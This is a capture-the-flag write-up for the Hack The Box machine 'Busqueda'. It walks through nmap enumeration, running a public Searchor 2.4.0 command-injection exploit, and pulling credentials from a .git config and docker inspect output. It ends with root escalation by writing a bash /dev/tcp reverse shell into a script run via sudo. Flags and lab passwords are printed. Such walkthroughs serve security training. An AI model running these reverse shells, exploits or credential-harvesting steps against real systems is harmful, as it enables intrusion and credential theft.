---
title: "Busqueda"
seoTitle: "Search Exploration"
seoDescription: "Exploit a system via enumeration, privilege escalation, and shell access using known CVEs and tools"
datePublished: Fri Feb 07 2025 06:45:32 GMT+0000 (Coordinated Universal Time)
cuid: cm6uejw5v000s0al2h73n9br5
slug: busqueda
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1738910687700/9e380472-e204-49d2-90a7-d485fbff1be2.png
tags: docker, hacking, hackthebox, cybersecurity-1, ctf-writeup, htb-writeup

---

IP: **10.129.228.217**

Let's start with the Nmap scan.

```bash
nmap -sC -sV -o nmap 10.129.228.217
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 11:38 EST
Nmap scan report for 10.129.228.217
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.92 seconds
```

We can see that we have `port 22 ssh` and `port 80 http` open where it redirects to [`http://searcher.htb`](http://searcher.htb). Let's add that to the host file.

```bash
sudo nano /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738909892125/b58cbba3-3a10-427c-b25a-0f11928029c3.png align="center")

let's now visit the webpage.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738909909631/7782da27-5165-4885-83f0-d30c5508cde6.png align="center")

This site allows for queries to be made to other sites like Accuweather. At the bottom of the page, we can also see that they are using Flask and Searchor 2.4.0. Doing some Google search we found that it has a CVE assigned to it.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738909953135/a65cb86f-5626-4e36-b758-c4e6ba688e9d.png align="left")

So, let's follow the POC and try to get a shell.

```bash
git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection.git
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738909965239/7ab6ed9b-5aa3-45ab-a28c-4d5d922b2589.png align="left")

```bash
./exploit.sh searcher.htb 10.10.14.104
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738909985153/52ce91ed-2739-404f-b848-4b8751f3c7a1.png align="center")

Let's check our Netcat listener.

```bash
rlwrap nc -nlvp 9001
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738909993124/b1edfb45-bcc4-42e9-9132-a7f48cb55949.png align="center")

Let's get our first flag now.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738909996609/0863ee5b-2c36-4913-ad60-3ec2b3fec5ac.png align="center")

Flag: *73510de022f7a3527af03bb9744427a8*

Now let's escalate our privileges to get to root. Let's list out the files.

```bash
ls -la
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910002047/3d116a6f-0cc8-4ec0-a372-2375f943fcb2.png align="center")

we can see that there's a `.git` folder let's check if we can find something interesting there.

```bash
cd .git
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910014919/5996254f-81dc-4078-ae56-a73b86f4f89f.png align="center")

Nice! We can see that a config file here might get some creds from it.

```bash
cat config
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910019481/809f6575-704b-46f9-99fd-88d49cbcab63.png align="center")

```bash
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

We got the SVC username which is `cody` and the password here `jh1usoih2bkjaspwe92` . As we saw in the nmap scan SSH was open so let's log in using it.

```bash
ssh svc@10.129.228.217
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910029893/54f9bf42-a463-42b3-b780-ccc286c1a915.png align="center")

And we're in. Let's first check the sudoer’s permission for the user.

```bash
sudo -l
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910032551/5d2adbfc-73a7-46e7-a4b0-1756ddf8063b.png align="center")

So, the user has root access to run `/usr/bin/python3 /opt/scripts/`[`system-checkup.py`](http://system-checkup.py) `*`. Let's run this and see what do we get.

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910036589/04f76a2c-ddce-43db-bc58-7f345182bbdc.png align="center")

Let's use the 3rd option to perform a full system checkup

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910041139/7d6f10b0-d7a1-4d97-94e1-bd120de9360f.png align="center")

If we try to edit the [`system-checkup.py`](http://system-checkup.py) script we don't have the permissions.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910044611/2f208e2e-b6a3-4142-b005-b6e8af77d00a.png align="center")

Nothing interesting to be found here. If we recall the config file we can see that the creds were used on `gitea.searcher.htb` let's add that into our host’s file.

```bash
sudo nano /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910057526/009dcbc5-ac92-4ca1-82cc-7d67f657329a.png align="center")

So, let's check if we can find something interesting there.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910060289/76dfabae-80cf-4c89-99c6-8f318b3588e4.png align="center")

We get the option to sign in let's use the creds we found.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910070934/eda2df58-0ceb-4bd8-9c65-d4a92463d604.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910074433/16ad2655-4c3c-4456-8c6b-25ee28c654a7.png align="center")

And we're successfully able to log in. We can see here 2 users `cody` and `administrator`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910079600/faf9928e-aaae-4e3a-b588-a5420b69e428.png align="center")

At Cody, we can see the source code for `Searcher_site` the website. Going a few steps back we missed out something.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910088476/adf51902-eefe-4a71-99ba-b7a1cbef7a29.png align="center")

We can see that we can use `docker-inspect` it to inspect some docker containers.

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910099890/fec542d2-28da-4bfd-9502-c9e93435b72a.png align="center")

So, it follows a particular format. We can view the usage information of the docker inspect command [here](https://docs.docker.com/reference/cli/docker/inspect/). If we follow this [page](https://docs.docker.com/engine/cli/formatting/) shows how the format works. If I pass it `{{ json [selector]}}` then whatever I give in selector will pick what displays. If I just give it `.` as the `selector`, it displays everything, which I’ll pipe into `jq` to pretty print.

```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910104955/6d03c1b9-500a-4aaf-bb1e-760ccc68d982.png align="center")

Going through the output we found something interesting.

```json
},
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```

Now, as we have MySQL creds let's try to log in but first, we need the IP of the database as well so let's get that.

```bash
sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910110472/c4d5b1f0-0cbb-4f92-9474-91e7942b5a52.png align="center")

Let's log in now.

```bash
mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910113346/043740bd-9e20-4c5c-8679-0b6101ad30d8.png align="center")

Let's first check for existing databases.

```bash
show databases;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910118378/439dd66d-82da-4f20-b3c8-0443a20a211d.png align="center")

`gitea` is the only interesting database we can find.

```bash
use gitea;
show tables;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910122249/67c13b4a-7d6a-4fd4-81c7-c6aea275f46d.png align="center")

The user table looks interesting so let's check that.

```bash
select * from user;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910125151/58738b94-6cd7-44c1-b44c-1a057d598e04.png align="center")

The output looks gibberish let's display specific columns only.

```bash
select name,email,passwd from user;
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910127519/b8fe0449-4da4-4e87-b817-5a43636f656a.png align="center")

We got the hash for the administrator user. Before trying to crack the hash let's first try to log in to gitea using administrator and reusing the password we got for mysql database .

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910130117/bb325e0e-7167-4c2d-85ad-2106be2ae2c1.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910136337/01dfb2e3-71f5-44c8-b634-b02084d8031c.png align="center")

And we're logged in as Administrator. Let's check the Scripts we have on this repository.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910138861/e3a81d42-6889-4552-87c7-99d7b8e3fd36.png align="center")

So, we found the same scripts that we were trying to execute earlier let's do code analysis.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910242782/ebe32aaf-c412-40af-a9aa-9944f014d809.png align="center")

Checking the [`system-checkup.py`](http://system-checkup.py) script we can see that it just runs the mentioned 3 commands. But the interesting part is

```python
 elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

that while handling full-checkup it tries to run [`full-checkup.sh`](http://full-checkup.sh) from the current directory so if we add anything to the [`full-checkup.sh`](http://full-checkup.sh) file it runs as root if we start [`system-checkup.py`](http://system-checkup.py) `full-checkup` in the same directory. So, let's try this.

```bash
nano full-checkup.sh
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910280959/5b538291-1f9f-418a-a921-77f72e1f62cf.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910285081/b5fcb468-52f8-44a1-8a68-a6d4d512b519.png align="center")

Now we can update the script to include a reverse shell.

```bash
bash -i >& /dev/tcp/10.10.14.104/443 0>&1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910288860/1a7b72e6-335a-41bf-809a-b3e8725ee230.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910292710/5def7556-e547-4aab-9f7c-44aed38f4467.png align="center")

Let's check our Netcat listener.

```bash
rlwrap nc -nlvp 443
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910296279/516341ef-61c5-41dc-8ba7-0e9d13dd8202.png align="center")

Now let's get our root flag.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1738910298792/f5c3b287-3d3b-43c0-8e63-33a6562ae34f.png align="center")

Flag: *36ea04a120e1d295ac9646a7dcc714ce*